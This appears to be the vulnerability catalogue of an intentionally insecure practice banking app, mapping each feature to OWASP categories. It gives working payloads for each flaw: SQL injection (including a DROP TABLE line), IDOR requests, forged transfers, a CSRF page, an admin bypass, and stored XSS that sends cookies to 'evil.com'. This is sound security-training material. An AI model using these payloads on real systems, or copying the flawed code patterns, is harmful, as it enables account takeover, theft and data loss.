Section 02

Vulnerability Catalogue

Each feature maps to one or more OWASP Top 10 categories. Every vulnerability is intentional and traceable to a specific line of code in the API routes.

Feature 01
Login & Registration
A01 A02 A03 A07
A03 · SQL Injection
Login bypass via username field. The query is built with string concatenation — injecting a comment sequence skips the password check entirely.
-- Payload (username field, any password) alice'-- -- Resulting SQL executed on server: SELECT * FROM users WHERE username = 'alice'--' AND password = '...' -- password check is commented out ^^
Register injection — the duplicate-check query also uses string concatenation:
-- username payload x' UNION SELECT 1,username,email,password,0,'','','','' FROM users--
A02 · Crypto Failure
Passwords hashed with unsalted MD5. MD5 is a fast hashing function not designed for passwords. Every hash above is instantly reversible via rainbow tables.
// lib/db.ts — line ~30 const md5 = (s) => createHash('md5').update(s).digest('hex') // Should be: bcrypt with cost factor ≥ 12
JWT secret is hardcoded (bukspay_secret_123) in lib/auth.ts.
Token cookie is set with httpOnly: false — readable from JavaScript.
A07 · Auth Failures
Username enumeration. Error messages distinguish between "Username not found" and "Wrong password" — attackers can enumerate valid usernames.

No rate limiting or lockout. Unlimited login attempts — brute force is unrestricted.

Tokens never expire — jwt.sign() called with no expiresIn.
Feature 02
Account Dashboard
A01 A02 A05
A01 · IDOR
Insecure Direct Object Reference. The ?userId= parameter is accepted from the URL with no session ownership check. Any user (or unauthenticated visitor) can view any account.
-- View bob's full account (logged in as alice, or not logged in) GET /api/dashboard?userId=2 GET /dashboard?userId=2 -- Enumerate all users: GET /api/dashboard?userId=1 → alice GET /api/dashboard?userId=2 → bob GET /api/dashboard?userId=3 → charlie GET /api/dashboard?userId=4 → admin
A02 + A05
Full row returned including password hash. The API response includes every column — email, phone, address, role, and the MD5 password hash — with no field filtering.
Feature 03
Money Transfer
A01 A03 A05
A01 · Spoofed Sender
fromUserId is trusted from the request body. Set it to any user's ID to drain their balance — no ownership verification on the server.
// POST /api/transfer { "toAccountNumber": "BUK-0001", // your account "amount": 15000, "fromUserId": "2", // steal from bob (id=2) "memo": "transfer" }
A03 · SQLi in Memo
Memo field concatenated into INSERT statement. Inject SQL to manipulate the transaction log.
// Memo payload — closes the string and injects SQL payment', 99999); UPDATE users SET balance=99999 WHERE id=1;--
A05 · No CSRF
No CSRF token on state-changing POST. A malicious page on another origin can silently submit a transfer on behalf of any logged-in user.
<!-- attacker's page --> <script> fetch('https://bukspay.vercel.app/api/transfer', { method: 'POST', credentials: 'include', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ toAccountNumber: 'BUK-ATTACKER', amount: 9999 }) }) </script>
Feature 04
Beneficiary Management
A01 A03 A05
A01 · IDOR Read
View any user's saved beneficiaries:
GET /api/beneficiaries?userId=2
A01 · IDOR Delete
Delete any beneficiary by ID — no ownership check. Enumerate IDs 1, 2, 3… to wipe another user's list:
DELETE /api/beneficiaries?id=1
A03 · Search SQLi
The search parameter is injected into a LIKE clause. Union-based extraction is possible:
GET /api/beneficiaries?userId=1&search=%25' UNION SELECT id,username,password,account_number,'' FROM users--
Feature 05
Profile Settings
A01 A02 A07
A07 · No Auth to Change Password
Current password is never verified before allowing a password change. If an attacker gains brief access to a session, they can permanently lock out the real user.
// PUT /api/profile { "newPassword": "hacked123", "userId": "2" } // No currentPassword field checked — changes bob's password
A01 · Mass Update
The userId in the request body is trusted. Update any user's profile or change their password without logging in as them.
Feature 06 · ⚠ Critical
Admin Panel
A01 Critical A02
A01 · Auth Bypass
A single query parameter grants full admin access. No session, no role check — just append ?admin=true to dump every user, transaction, and loan in the database.
-- No cookies, no login, completely unauthenticated: GET /api/admin?admin=true -- Returns all users with plaintext MD5 hashes, -- all transactions, all loan applications
A01 · Unauth Actions
The admin POST endpoint has no authentication at all. Adjust any balance, promote any user to admin, or delete any account:
POST /api/admin { "action": "changeRole", "userId": "2", "role": "admin" } { "action": "adjustBalance", "userId": "1", "amount": 999999 } { "action": "deleteUser", "userId": "3" }
Feature 07
Transaction History
A01 A02 A03 A05
A01 · IDOR
View the full transaction history of any user without authentication:
GET /api/transactions?userId=2 → all of bob's transactions
A03 · ORDER BY Injection
The filter parameter is injected directly into the ORDER BY clause. This can be used to extract data via boolean-based inference or trigger errors that leak schema information.
GET /api/transactions?filter=(SELECT CASE WHEN (1=1) THEN amount ELSE id END) GET /api/transactions?filter=1; DROP TABLE users--
A03 · Stored XSS
The memo field is rendered with dangerouslySetInnerHTML in the transactions table. Send a transfer with a script payload as the memo — it executes for any user who views their history.
// Memo payload in transfer form: <img src=x onerror="alert(document.cookie)"> <script>fetch('https://evil.com/?c='+document.cookie)</script>
Feature 08
Loan / Credit Request
A01 A03 A05 A07
A07 · No Auth
Loan submission requires no authentication. POST a loan application with any userId — the server inserts it with no session check.
POST /api/loans { "userId": "2", "amount": 50000, "purpose": "...", "employment": "Employed", "monthlyIncome": 100000 }
A01 · Auto-approve
?isVIP=true immediately approves the loan and credits the full amount to the user's balance. No admin review. Works for any userId.
POST /api/loans?isVIP=true { "userId": "1", "amount": 999999, ... }
A03 · SQLi in Purpose
The purpose and employment fields are concatenated into the INSERT — classic in-band injection:
business', 'approved'); UPDATE users SET balance=99999 WHERE id=1;--
